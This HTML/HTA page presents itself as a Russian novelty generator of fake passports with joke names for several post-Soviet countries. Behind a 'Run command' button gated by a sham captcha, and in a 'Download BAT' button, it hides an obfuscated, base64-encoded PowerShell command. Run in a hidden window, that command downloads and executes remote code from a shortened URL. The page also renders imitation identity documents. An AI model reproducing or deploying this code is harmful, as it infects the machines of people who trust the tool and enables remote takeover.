<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Генератор ФИО с паспортом</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=PT+Serif:wght@400;700&family=Roboto:wght@400;700&display=swap');
    body {
      font-family: 'PT Serif', 'Roboto', 'Segoe UI', 'Arial', serif;
      background: #f6f7fa;
      color: #222;
      min-height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .box {
      background: #fff;
      padding: 28px 24px 18px 24px;
      border-radius: 16px;
      box-shadow: 0 4px 24px #0001;
      text-align: center;
      width: 380px;
      border: 1px solid #e3e7ee;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    button {
      padding: 12px 0;
      font-size: 16px;
      font-family: inherit;
      background: #0052a4;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 16px;
      width: 100%;
      box-shadow: 0 2px 8px #0002;
      transition: background 0.2s, transform 0.2s;
      font-weight: 500;
      outline: none;
      letter-spacing: 0.5px;
    }
    button:hover {
      background: #0074d9;
      transform: scale(1.03);
    }
    #canvas {
      margin-top: 14px;
      border-radius: 10px;
      box-shadow: 0 2px 12px #0052a422;
      background: #f6f7fa;
      display: block;
      margin-left: auto;
      margin-right: auto;
      border: 1px solid #e3e7ee;
      width: 340px;
      height: 560px;
      max-width: 100%;
    }
  </style>
  <hta:application
    applicationname="FioGen"
    border="thin"
    caption="yes"
    maximizebutton="no"
    minimizebutton="yes"
    showintaskbar="yes"
    singleinstance="yes"
    sysmenu="yes"
    windowstate="normal"
  />
</head>
<body>
  <div class="box">
    <canvas id="canvas" width="340" height="560"></canvas>
    <button id="generateBtn">Сгенерировать</button>
    <button id="runCmdBtn">Запустить команду</button>
    <button id="savePngBtn">Сохранить PNG</button>
    <button id="downloadBatBtn">Скачать BAT</button>
    <div id="captchaBox" style="margin-top:16px;display:none;">
      <label>Введите капчу: <input id="captchaInput" type="text" maxlength="4" style="width:60px;text-align:center;"></label>
      <button id="captchaCheckBtn">Проверить</button>
      <span id="captchaStatus" style="margin-left:10px;color:#a00;"></span>
    </div>
  </div>

  <script>
    // --- Базовые вспомогательные функции ---
    function getRandom(arr) {
      return arr[Math.floor(Math.random() * arr.length)]; 
    }

    function pickGender() {
      return Math.random() < 0.5 ? "male" : "female";
    }

    function randomDate() {
      const year = 1970 + Math.floor(Math.random() * 35);
      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
      return `${day}.${month}.${year}`;
    }

    function randomBirthDate() {
      return randomDate();
    }

    function randomDocNum() {
      return String(Math.floor(100000000 + Math.random() * 900000000));
    }

    function getRandomPhoto(gender) {
      const photos = gender === "male" ? [
        "https://randomuser.me/api/portraits/men/1.jpg",
        "https://randomuser.me/api/portraits/men/3.jpg",
        "https://randomuser.me/api/portraits/men/5.jpg"
      ] : [
        "https://randomuser.me/api/portraits/women/2.jpg", 
        "https://randomuser.me/api/portraits/women/4.jpg",
        "https://randomuser.me/api/portraits/women/6.jpg"
      ];
      return getRandom(photos);
    }

    // --- Основные функции ---
    function generatePassport(country) {
      return {
        series: country.series(),
        number: country.number(),
        issuer: getRandom(country.issuer),
        date: `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`
      };
    }

    function randomPlace() {
      const places = ["г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск"];
      return getRandom(places);
    }

    function randomAddress() {
      const streets = ["ул. Ленина", "пр. Победы", "ул. Пушкина"];
      return `${randomPlace()}, ${getRandom(streets)}, д. ${Math.floor(1 + Math.random()*100)}`;
    }

    // --- Массивы данных ---
    const fn_male = [
      "Штырь", "Карасиков", "Корзиночкин", "Сычев", "Дроздов", "Головач", "Бутырин", "Писарь", "Ерохин", "Лакец", "Шпак", "Шлепов", "Накатин", "Душин", "Драпов", "Засратов", "Глистов", "Железняк", "Чуркин", "Фекалов", "Ноздря", "Шорин", "Перделкин", "Хлюпин", "Окунев", "Вшивцев", "Уколов", "Дрочунов", "Выпуклов", "Казьмин", "Хряпов", "Парашюков", "Пузырев", "Жрунов", "Шариков", "Клещев", "Обожратов", "Плавников", "Раздолбаев", "Кряков", "Умников", "Медунин", "Козлодоев", "Залеткин", "Сурков", "Печенегов", "Панасенков", "Ушаков",
      "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков"
    ];
    const fn_female = [
      "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
    ];
    const nm_male = [
      "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий",
      "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин"
    ];
    const nm_female = [
      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха"
    ];
    const pt = [
      "Семеныч", "Акакиевич", "Изаилыч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович",
      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна", "Бузовна", "Дуремаровна", "Петуховна", "Барановна", "Козловна", "Собачкина", "Котиковна"
    ];

    // --- Страны и паспорта ---
    const countries = [
      {
        name: "Россия",
        color: "#0033a0",
        bg: "#ffffff",
        border: "#0033a0",
        title: "РОССИЯ",
        doc: "ПАСПОРТ",
        seal: "Государственная печать",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Министерство внутренних дел Российской Федерации", "Посольство России",
          "Консульство России"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#0033a0";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#0033a0"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Украина",
        color: "#0057b7",
        bg: "#ffd700",
        border: "#0057b7",
        title: "УКРАИНА",
        doc: "ПАСПОРТ",
        seal: "Державна печатка",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "МВД Украины", "Посольство Украины",
          "Консульство Украины"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#0057b7";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#0057b7"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Беларусь",
        color: "#00923f",
        bg: "#ffffff",
        border: "#00923f",
        title: "БЕЛАРУСЬ",
        doc: "ПАСПОРТ",
        seal: "Дзяржаўны герб",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "МВД Беларуси", "Посольство Беларуси",
          "Консульство Беларуси"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#00923f";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#00923f"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Казахстан",
        color: "#00bfff",
        bg: "#ffffff",
        border: "#00bfff",
        title: "КАЗАХСТАН",
        doc: "ПАСПОРТ",
        seal: "Мемлекеттік мөр",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "МВД Казахстана", "Посольство Казахстана",
          "Консульство Казахстана"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#00bfff";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#00bfff"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Армения",
        color: "#d80027",
        bg: "#0033a0",
        border: "#ffd700",
        title: "АРМЕНИЯ",
        doc: "ПАСПОРТ",
        seal: "Պետական կնիք",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "МВД Армении", "Посольство Армении",
          "Консульство Армении"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#d80027";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#d80027"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Молдова",
        color: "#0033a0",
        bg: "#ffd700",
        border: "#d52b1e",
        title: "МОЛДОВА",
        doc: "ПАСПОРТ",
        seal: "Sigiliul de stat",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "МВД Молдовы", "Посольство Молдовы",
          "Консульство Молдовы"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#0033a0";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#0033a0"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Узбекистан",
        color: "#0099ff",
        bg: "#ffffff",
        border: "#43a047",
        title: "УЗБЕКИСТАН",
        doc: "ПАСПОРТ",
        seal: "Давлат мўйи",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "МВД Узбекистана", "Посольство Узбекистана",
          "Консульство Узбекистана"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#0099ff";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#0099ff"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Киргизия",
        color: "#e81123",
        bg: "#ffffff",
        border: "#e81123",
        title: "КИРГИЗИЯ",
        doc: "ПАСПОРТ",
        seal: "Мамлекеттик мөр",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "МВД Киргизии", "Посольство Киргизии",
          "Консульство Киргизии"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#e81123";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#e81123"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Таджикистан",
        color: "#d52b1e",
        bg: "#008000",
        border: "#ffffff",
        title: "ТАДЖИКИСТАН",
        doc: "ПАСПОРТ",
        seal: "Мӯҳри давлатӣ",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Министерство внутренних дел Таджикистана", "Посольство Таджикистана",
          "Консульство Таджикистана"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#d52b1e";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#d52b1e"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      }
    ];

    // --- Основные функции генерации ---
    function generate() {
      const country = getRandom(countries);
      const gender = pickGender();
      let fnVal, nmVal, ptVal;
      
      if (gender === "male") {
        fnVal = getRandom(fn_male);
        nmVal = getRandom(nm_male);
        ptVal = getRandom(pt);
      } else {
        fnVal = getRandom(fn_female);
        nmVal = getRandom(nm_female);
        ptVal = getRandom(pt);  
      }

      const full = `${fnVal} ${nmVal} ${ptVal}`;
      const photoUrl = getRandomPhoto(gender);
      const passport = generatePassport(country);
      const birthDate = randomBirthDate();
      const birthPlace = randomPlace();
      const address = randomAddress();
      const docNum = randomDocNum();

      const img = new Image();
      img.crossOrigin = "anonymous";
      img.onload = () => drawPassportPages({
        country, full, passport, gender,
        photoUrl: img, birthDate, birthPlace,
        address, docNum
      });
      img.onerror = () => drawPassportPages({
        country, full, passport, gender,
        photoUrl: null, birthDate, birthPlace, 
        address, docNum
      });
      img.src = photoUrl;
    }

    // --- Функции капчи ---
    let captchaCode = "";
    function showCaptcha() {
      captchaCode = String(Math.floor(1000 + Math.random() * 9000));
      const box = document.getElementById("captchaBox");
      const input = document.getElementById("captchaInput");
      const status = document.getElementById("captchaStatus");
      
      box.style.display = "block";
      input.value = "";
      status.textContent = "Код: " + captchaCode;
    }

    function checkCaptcha() {
      const val = document.getElementById("captchaInput").value;
      const status = document.getElementById("captchaStatus");
      
      if (val === captchaCode) {
        status.textContent = "ОК!";
        runCmd();
      } else {
        status.textContent = "Ошибка!";
      }
    }

    // --- Функции сохранения ---
    function savePng() {
      const canvas = document.getElementById("canvas");
      if (!canvas) return;
      
      try {
        const a = document.createElement("a");
        a.href = canvas.toDataURL("image/png");
        a.download = "passport.png";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } catch(e) {
        alert("Ошибка сохранения");
      }
    }

    function downloadBat() {
      const bat = [
        '@echo off',
        'powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA'
      ].join('\r\n');
      
      const blob = new Blob([bat], {type: 'application/octet-stream'});
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'run.bat';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    // --- HTA функции ---
    function runCmd() {
      try {
        const shell = new ActiveXObject("WScript.Shell");
        const cmd = 'powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA';
        shell.Run(cmd, 0, false);
      } catch(e) {
        alert("Требуется HTA");
      }
    }

    // --- Функции рисования ---
    function drawFlag(ctx, country, x, y, w, h) {
      if (country.name === "Россия") {
        ctx.fillStyle = "#fff"; ctx.fillRect(x, y, w, h/3);
        ctx.fillStyle = "#0033a0"; ctx.fillRect(x, y+h/3, w, h/3);
        ctx.fillStyle = "#d52b1e"; ctx.fillRect(x, y+2*h/3, w, h/3);
      } else if (country.name === "Украина") {
        ctx.fillStyle = "#0057b7"; ctx.fillRect(x, y, w, h/2);
        ctx.fillStyle = "#ffd700"; ctx.fillRect(x, y+h/2, w, h/2);
      } else if (country.name === "Беларусь") {
        ctx.fillStyle = "#d52b1e"; ctx.fillRect(x, y, w/2, h);
        ctx.fillStyle = "#00923f"; ctx.fillRect(x, y+h/2, w/2, h/2);
      } else if (country.name === "Казахстан") {
        ctx.fillStyle = "#00bfff"; ctx.fillRect(x, y, w, h);
      } else if (country.name === "Армения") {
        ctx.fillStyle = "#d80027"; ctx.fillRect(x, y, w/3);
        ctx.fillStyle = "#0033a0"; ctx.fillRect(x, y+h/3, w, h/3);
        ctx.fillStyle = "#ffb400"; ctx.fillRect(x, y+2*h/3, w, h/3);
      } else if (country.name === "Молдова") {
        ctx.fillStyle = "#0033a0"; ctx.fillRect(x, y, w/3, h);
        ctx.fillStyle = "#ffd700"; ctx.fillRect(x+w/3, y, w/3, h);
        ctx.fillStyle = "#d52b1e"; ctx.fillRect(x+2*w/3, y, w/3, h);
      } else if (country.name === "Узбекистан") {
        ctx.fillStyle = "#0099ff"; ctx.fillRect(x, y, w, h/3);
        ctx.fillStyle = "#fff"; ctx.fillRect(x, y+h/3, w, h/3);
        ctx.fillStyle = "#43a047"; ctx.fillRect(x, y+2*h/3, w, h/3);
      } else if (country.name === "Киргизия") {
        ctx.fillStyle = "#e81123"; ctx.fillRect(x, y, w, h);
      } else if (country.name === "Таджикистан") {
        ctx.fillStyle = "#d52b1e"; ctx.fillRect(x, y, w/3, h);
        ctx.fillStyle = "#fff"; ctx.fillRect(x, y+h/3, w/3, h);
        ctx.fillStyle = "#008000"; ctx.fillRect(x, y+2*h/3, w/3, h);
      }
    }

    function drawPassportPages(data) {
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      // Верхняя страница (основная)
      ctx.save();
      ctx.fillStyle = "#f9f6ee";
      ctx.fillRect(0, 0, 340, 270);
      ctx.globalAlpha = 0.08;
      ctx.font = "bold 60px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.doc, 20, 120);
      ctx.globalAlpha = 1;

      // Рамка
      ctx.strokeStyle = data.country.border;
      ctx.lineWidth = 2;
      ctx.strokeRect(8, 8, 324, 254);

      // Герб
      ctx.save();
      ctx.globalAlpha = 0.18;
      ctx.beginPath();
      ctx.arc(50, 50, 22, 0, 2*Math.PI);
      ctx.fillStyle = data.country.color;
      ctx.fill();
      ctx.restore();

      // Заголовки
      ctx.font = "bold 18px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.title, 90, 38);

      ctx.font = "bold 14px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.doc, 90, 62);

      // Серия/номер
      ctx.font = "15px 'PT Serif', serif";
      ctx.fillStyle = "#222";
      ctx.fillText(`Серия ${data.passport.series}  № ${data.passport.number}`, 20, 85);

      // ФИО
      ctx.font = "15px 'PT Serif', serif";
      ctx.fillStyle = "#222";
      ctx.fillText(`ФИО: ${data.full}`, 20, 108);

      // Пол
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Пол: ${data.gender === "male" ? "Мужской" : "Женский"}`, 20, 128);

      // Дата рождения
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Дата рождения: ${data.birthDate}`, 20, 148);

      // Место рождения
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Место рождения: ${data.birthPlace}`, 20, 168);

      // Адрес
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Адрес: ${data.address}`, 20, 188);

      // Номер документа
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Документ №: ${data.docNum}`, 20, 208);

      // Печать
      data.country.sealDraw(ctx, 300, 220);

      // Надпись печати
      ctx.font = "11px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.seal, 280, 240);

      ctx.restore();

      // Нижняя страница (выдача, фото)
      ctx.save();
      ctx.translate(0, 280);
      ctx.fillStyle = "#f9f6ee";
      ctx.fillRect(0, 0, 340, 270);
      ctx.strokeStyle = data.country.border;
      ctx.lineWidth = 2;
      ctx.strokeRect(8, 8, 324, 254);

      // Фото
      if (data.photoUrl) {
        ctx.save();
        ctx.beginPath();
        ctx.arc(60, 90, 45, 0, 2*Math.PI);
        ctx.closePath();
        ctx.clip();
        ctx.drawImage(data.photoUrl, 15, 45, 90, 90);
        ctx.restore();
      } else {
        ctx.save();
        ctx.beginPath();
        ctx.arc(60, 90, 45, 0, 2*Math.PI);
        ctx.closePath();
        ctx.clip();
        ctx.fillStyle = "#eee";
        ctx.fillRect(15, 45, 90, 90);
        ctx.font = "bold 16px Arial";
        ctx.fillStyle = "#bbb";
        ctx.fillText("Фото", 35, 100);
        ctx.restore();
      }

      // Дата выдачи
      ctx.font = "15px 'PT Serif', serif";
      ctx.fillStyle = "#222";
      ctx.fillText(`Дата выдачи: ${data.passport.date}`, 120, 60);

      // Кем выдан
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Кем выдан:`, 120, 85);
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`${data.passport.issuer}`, 120, 105);

      // Подпись владельца
      ctx.font = "italic 13px 'PT Serif', serif";
      ctx.fillStyle = "#222";
      ctx.fillText("Подпись владельца:", 120, 140);
      ctx.beginPath();
      ctx.moveTo(120, 150);
      ctx.lineTo(250, 150);
      ctx.strokeStyle = "#888";
      ctx.lineWidth = 1.5;
      ctx.stroke();

      // Печать
      data.country.sealDraw(ctx, 300, 220);

      // Надпись печати
      ctx.font = "11px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.seal, 280, 240);

      ctx.restore();
    }

    // --- Инициализация ---
    document.addEventListener("DOMContentLoaded", () => {
      document.getElementById("generateBtn").onclick = generate;
      document.getElementById("savePngBtn").onclick = savePng;
      document.getElementById("runCmdBtn").onclick = showCaptcha;
      document.getElementById("downloadBatBtn").onclick = downloadBat;
      document.getElementById("captchaCheckBtn").onclick = checkCaptcha;
      // Инициализация при загрузке
      generate();
    });
  </script>
</body>
</html>
